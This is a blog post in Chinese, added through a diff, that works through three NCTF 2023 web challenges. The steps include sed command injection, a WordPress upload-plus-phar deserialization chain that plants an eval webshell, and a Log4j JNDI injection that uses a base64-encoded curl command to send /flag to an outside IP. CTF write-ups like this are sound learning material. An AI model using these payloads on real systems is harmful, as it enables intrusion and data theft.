@@ -1,0 +1,839 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Greed">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="2023nctf协会群里随机组队，web一共做出来三道，还是菜了，java的题都没接触过，全是从头开始学然后利用，还好考的不算偏，都能搜到，还侥幸拿了个一血。剩下的题等官方wp复现 webshell下载框，任意文件读取，无权访问 &#x2F;flag 主要文件有三个 index.php 12345678910111213141516171819202122232425262728293031&lt;?php">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NCTF2023wp-web">
+<meta property="og:url" content="https://just1greed.github.io/2023/12/25/NCTF2023wp-web/index.html">
+<meta property="og:site_name" content="Welcome to greed&#39; blog">
+<meta property="og:description" content="2023nctf协会群里随机组队，web一共做出来三道，还是菜了，java的题都没接触过，全是从头开始学然后利用，还好考的不算偏，都能搜到，还侥幸拿了个一血。剩下的题等官方wp复现 webshell下载框，任意文件读取，无权访问 &#x2F;flag 主要文件有三个 index.php 12345678910111213141516171819202122232425262728293031&lt;?php">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://just1greed.github.io/2023/12/25/NCTF2023wp-web/image-20231224163234844-17034694934901.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/12/25/NCTF2023wp-web/image-20231224172735794-17034694934902.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/12/25/NCTF2023wp-web/image-20231223124409790-17034694934913.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/12/25/NCTF2023wp-web/image-20231223123546744-17034694934914.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/12/25/NCTF2023wp-web/image-20231223123854627-17034694934915.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/12/25/NCTF2023wp-web/image-20231223125028267-17034694934916.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/12/25/NCTF2023wp-web/image-20231224201444366-17034694934927.png">
+<meta property="article:published_time" content="2023-12-25T01:56:13.000Z">
+<meta property="article:modified_time" content="2023-12-25T02:02:12.589Z">
+<meta property="article:author" content="Greed">
+<meta property="article:tag" content="解题记录">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://just1greed.github.io/2023/12/25/NCTF2023wp-web/image-20231224163234844-17034694934901.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>NCTF2023wp-web - Welcome to greed&#39; blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"just1greed.github.io","root":"/","version":"1.9.5-a","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>greed&#39; blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="NCTF2023wp-web"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-12-25 09:56" pubdate>
+          2023年12月25日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          42 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">NCTF2023wp-web</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：几秒前
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h3 id="2023nctf"><a href="#2023nctf" class="headerlink" title="2023nctf"></a>2023nctf</h3><p>协会群里随机组队，web一共做出来三道，还是菜了，java的题都没接触过，全是从头开始学然后利用，还好考的不算偏，都能搜到，还侥幸拿了个一血。剩下的题等官方wp复现</p>
+<h4 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h4><p>下载框，任意文件读取，无权访问 <code>/flag</code></p>
+<p>主要文件有三个</p>
+<p>index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">security_validate</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\r|\n/&#x27;</span>, <span class="hljs-variable">$value</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$key</span> 不能包含换行符！&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$value</span>) &gt; <span class="hljs-number">114</span>) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$key</span> 不能超过114个字符！&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-title function_ invoke__">security_validate</span>();<br><span class="hljs-keyword">if</span> (@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;method&#x27;</span>] &amp;&amp; @<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key&#x27;</span>] &amp;&amp; @<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;language&#x27;</span>] !== <span class="hljs-string">&#x27;PHP&#x27;</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;PHP是最好的语言&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$method</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;method&#x27;</span>];<br>    <span class="hljs-variable">$key</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;METHOD=<span class="hljs-subst">$method</span>&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你的method太复杂了！&quot;</span>);<br>    <span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;KEY=<span class="hljs-subst">$key</span>&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你的key太复杂了！&quot;</span>);<br>    <span class="hljs-variable">$status_code</span> = -<span class="hljs-number">1</span>;<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&quot;sh generate.sh&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$filename</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;生成失败了！&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$filename</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: download.php?file=<span class="hljs-subst">$filename</span>&amp;filename=<span class="hljs-subst">&#123;$_POST[&#x27;filename&#x27;]&#125;</span>&quot;</span>);<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>download.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type: application/octet-stream&quot;</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Disposition: attachment; filename=<span class="hljs-subst">$filename</span>&quot;</span>);<br>    <span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$file</span>);<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>generate.sh</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br><br><span class="hljs-built_in">set</span> -e<br><br>NEW_FILENAME=$(<span class="hljs-built_in">tr</span> -dc a-z0-9 &lt;/dev/urandom | <span class="hljs-built_in">head</span> -c 16)<br><span class="hljs-built_in">cp</span> template.php <span class="hljs-string">&quot;/tmp/<span class="hljs-variable">$NEW_FILENAME</span>&quot;</span><br><span class="hljs-built_in">cd</span> /tmp<br><br>sed -i <span class="hljs-string">&quot;s/KEY/<span class="hljs-variable">$KEY</span>/g&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$NEW_FILENAME</span>&quot;</span><br>sed -i <span class="hljs-string">&quot;s/METHOD/<span class="hljs-variable">$METHOD</span>/g&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$NEW_FILENAME</span>&quot;</span><br><br><span class="hljs-built_in">realpath</span> <span class="hljs-string">&quot;<span class="hljs-variable">$NEW_FILENAME</span>&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>可以控制环境变量和任意文件读取，但是不能修改环境变量的名字，所以不能尝试利用 <code>LD_PRELOAD</code></p>
+<p>在sed里利用 <code>/</code> 截断，可以任意命令执行(要在命令头加个 e，没来得及研究为啥，echo的时候试出来的)，先尝试 curl 看看是否出网</p>
+<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">language=PHP&amp;<span class="hljs-keyword">method</span>=<span class="hljs-title function_">a</span>/<span class="hljs-title function_">g</span>; ecurl http:<span class="hljs-comment">//118.25.19.88:8888&amp;key=123&amp;filename=webshell.php</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/25/NCTF2023wp-web/image-20231224163234844-17034694934901.png" srcset="/img/loading.gif" lazyload alt="image-20231224163234844"></p>
+<p>这里尝试弹shell，卡了半天，最后改用写文件，直接出</p>
+<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs oxygene"><span class="hljs-keyword">method</span>=<span class="hljs-title function_">a</span>/<span class="hljs-title function_">g</span>; e/readflag &gt; /tmp<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/25/NCTF2023wp-web/image-20231224172735794-17034694934902.png" srcset="/img/loading.gif" lazyload alt="image-20231224172735794"></p>
+<h4 id="wordpress"><a href="#wordpress" class="headerlink" title="wordpress"></a>wordpress</h4><p>利用wpscan扫到了相关信息，其中用到了 <code>all-in-one-video-gallery </code> 插件，经过搜索得知存在两个漏洞，<code>ssrf</code> 和 任意文件读取，其实就是同一个地方的两种不同利用</p>
+<p>[WordPress All-in-One Video Gallery video.php 任意文件读取漏洞 CVE-2022-2633 | PeiQi文库 (wgpsec.org)](<a target="_blank" rel="noopener" href="https://peiqi.wgpsec.org/wiki/serverapp/WordPress/WordPress">https://peiqi.wgpsec.org/wiki/serverapp/WordPress/WordPress</a> All-in-One Video Gallery video.php 任意文件读取漏洞 CVE-2022-2633.html)</p>
+<p><a target="_blank" rel="noopener" href="https://downloads.wordpress.org/plugin/all-in-one-video-gallery.2.6.0.zip">https://downloads.wordpress.org/plugin/all-in-one-video-gallery.2.6.0.zip</a> </p>
+<p>下载源码，定位到漏洞位置，查看具体过程，好叭，就是单纯读出来<img src="/2023/12/25/NCTF2023wp-web/image-20231223124409790-17034694934913.png" srcset="/img/loading.gif" lazyload alt="image-20231223124409790"></p>
+<p>先尝试了任意文件读取，确实能读到 <code>/etc/passwd</code> </p>
+<p><img src="/2023/12/25/NCTF2023wp-web/image-20231223123546744-17034694934914.png" srcset="/img/loading.gif" lazyload alt="image-20231223123546744"></p>
+<p>但是尝试 <code>/flag</code> 却失败，尝试读环境变量，没发现flag<img src="/2023/12/25/NCTF2023wp-web/image-20231223123854627-17034694934915.png" srcset="/img/loading.gif" lazyload alt="image-20231223123854627"></p>
+<p>试试伪协议，能读，不能执行</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">/index.php/video/?dl=php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">read</span>=<span class="hljs-built_in">convert</span>.base64-encode/resource=../../../../../../proc/self/environ<br><br><span class="hljs-comment"># 编码后</span><br>/index.php/video/?dl=cGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS4uLy4uLy4uLy4uLy4uLy4uL3Byb2Mvc2VsZi9lbnZpcm9u<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/25/NCTF2023wp-web/image-20231223125028267-17034694934916.png" srcset="/img/loading.gif" lazyload alt="image-20231223125028267"></p>
+<p>卡了三四个小时，回到信息收集，整理已有信息</p>
+<p>查看wpscan给我发的扫描报告，发现可利用的漏洞有: ssrf，任意文件读取，任意文件上传，还有wp版本的任意文件执行(需要反序列化链)，一个思路出现了：<code>文件上传-&gt;phar协议读取-&gt;原生态反序列化-&gt;RCE</code></p>
+<p>现在开始去找文件上传点<a target="_blank" rel="noopener" href="https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/drag-and-drop-multiple-file-upload-contact-form-7/drag-and-drop-multiple-file-upload-contact-form-7-1374-unauthenticated-arbitrary-file-upload">拖放多个文件上传 - 联系表单 7 &lt;&#x3D; 1.3.7.3 - 未经身份验证的任意文件上传 (wordfence.com)</a></p>
+<p>找错地方了….</p>
+<p>走了两个多小时弯路，最后发现是这篇<a target="_blank" rel="noopener" href="https://wpscan.com/vulnerability/035dffef-4b4b-4afb-9776-7f6c5e56452c/">Drag and Drop Multiple File Upload &lt; 1.3.6.5 – File Upload Size Limit Bypass | Plugin Vulnerabilities (wpscan.com)</a></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">curl</span> <span class="hljs-literal">-X</span> POST <span class="hljs-operator">-F</span> <span class="hljs-string">&quot;size_limit=10485760&quot;</span> <span class="hljs-operator">-F</span> <span class="hljs-string">&quot;action=dnd_codedropz_upload&quot;</span> <span class="hljs-operator">-F</span> <span class="hljs-string">&quot;type=click&quot;</span> <span class="hljs-operator">-F</span> <span class="hljs-string">&quot;form_id=156&quot;</span> <span class="hljs-operator">-F</span> <span class="hljs-string">&quot;upload_name=upload-file-235&quot;</span> <span class="hljs-operator">-F</span> <span class="hljs-string">&quot;upload-file=@exp.png&quot;</span>  http://<span class="hljs-number">124.71</span>.<span class="hljs-number">184.68</span>:<span class="hljs-number">8012</span>/wp<span class="hljs-literal">-admin</span>/admin<span class="hljs-literal">-ajax</span>.php<br></code></pre></td></tr></table></figure>
+
+
+
+<p>现在去构造链然后做phar，用 <code>phpggc</code> (标的cmd但其实是函数调用)</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">./phpggc WordPress/RCE2 system id<br># O:<span class="hljs-number">13</span>:<span class="hljs-string">&quot;WP_HTML_Token&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">13</span>:<span class="hljs-string">&quot;bookmark_name&quot;</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;id&quot;</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;on_destroy&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>生成phar文件，改后缀为png，上传</p>
+<p>在readme里看到临时上传目录 <code>/wp-content/uploads/wp_dndcf7_uploads</code> </p>
+<p>burp准备利用phar协议读文件 <code>phar:///var/www/html/wp-content/uploads/wp_dndcf7_uploads/wpcf7-files/exp.png</code> </p>
+<p>成功上传，也能正常执行命令，但是反弹shell失败了，尝试写入webshell，过滤了 <code>$_REQUEST</code> <code>$_POST</code> <code>$_GET</code> </p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">./phpggc/phpggc -p phar -o exp.png WordPress/RCE2 system &quot;echo &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27; &gt; /var/www/html/greed.php&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>再经过测试，是匹配每一个 $ 到 ] 中间的全部删掉，改用 <code>eval(file_contect(&#39;php://input&#39;))</code> ，md，过滤我单引号</p>
+<p>最后得到的结论是…没有转义…</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">./phpggc/phpggc <span class="hljs-literal">-p</span> phar <span class="hljs-literal">-o</span> exp.png WordPress/RCE2 system <span class="hljs-string">&quot;echo &#x27;&lt;?php eval(\<span class="hljs-variable">$_POST</span>[1]);?&gt;&#x27; &gt; /var/www/html/greed.php&quot;</span><br><br><span class="hljs-built_in">curl</span> <span class="hljs-literal">-X</span> POST <span class="hljs-operator">-F</span> <span class="hljs-string">&quot;size_limit=10485760&quot;</span> <span class="hljs-operator">-F</span> <span class="hljs-string">&quot;action=dnd_codedropz_upload&quot;</span> <span class="hljs-operator">-F</span> <span class="hljs-string">&quot;type=click&quot;</span> <span class="hljs-operator">-F</span> <span class="hljs-string">&quot;form_id=156&quot;</span> <span class="hljs-operator">-F</span> <span class="hljs-string">&quot;upload_name=upload-file-235&quot;</span> <span class="hljs-operator">-F</span> <span class="hljs-string">&quot;upload-file=@exp.png&quot;</span>  http://<span class="hljs-number">124.71</span>.<span class="hljs-number">184.68</span>:<span class="hljs-number">8012</span>/wp<span class="hljs-literal">-admin</span>/admin<span class="hljs-literal">-ajax</span>.php<br></code></pre></td></tr></table></figure>
+
+
+
+<p>上马，出城，suid提权 <code>date</code> ，这里搜索的方式不对，导致上来就排除正确答案，唉</p>
+<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">nctf</span><span class="hljs-template-variable">&#123;insecure_wordpress_core_deserialization_BWxMCmos0pzTcNFw&#125;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="logging"><a href="#logging" class="headerlink" title="logging"></a>logging</h4><p>log4j2的rce，fuzz请求头，发现 Accect 参数的值会被记录并解析，dnslog验证可用，利用工具 <code>JNDI-Injection-Exploit</code> ，尝试反弹shell卡了好久，最后用curl外带出 flag，记得带套 <code>&#123;&#125;</code> </p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">curl</span> http://<span class="hljs-number">118.25.19.88:9999</span>$(cat /flag)<br><br><span class="hljs-attribute">Y3VybCBodHRwOi8vMTE4LjI1LjE5Ljg4Ojk5OTkvJChjYXQgL2ZsYWcp</span><br><br><span class="hljs-attribute">java</span> -jar JNDI-Injection-Exploit-<span class="hljs-number">1</span>.<span class="hljs-number">0</span>-SNAPSHOT-<span class="hljs-literal">all</span>.jar -C <span class="hljs-string">&quot;bash -c &#123;echo,Y3VybCBodHRwOi8vMTE4LjI1LjE5Ljg4Ojk5OTkvJChjYXQgL2ZsYWcp&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> -A <span class="hljs-number">118.25.19.88</span><br><br></code></pre></td></tr></table></figure>
+
+<p><code>python -m http.server 9999</code> </p>
+<p><img src="/2023/12/25/NCTF2023wp-web/image-20231224201444366-17034694934927.png" srcset="/img/loading.gif" lazyload alt="image-20231224201444366"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/" class="print-no-link">#解题记录</a>
+      
+        <a href="/tags/ctf/" class="print-no-link">#ctf</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>NCTF2023wp-web</div>
+      <div>https://just1greed.github.io/2023/12/25/NCTF2023wp-web/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Greed</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年12月25日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2023年12月25日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
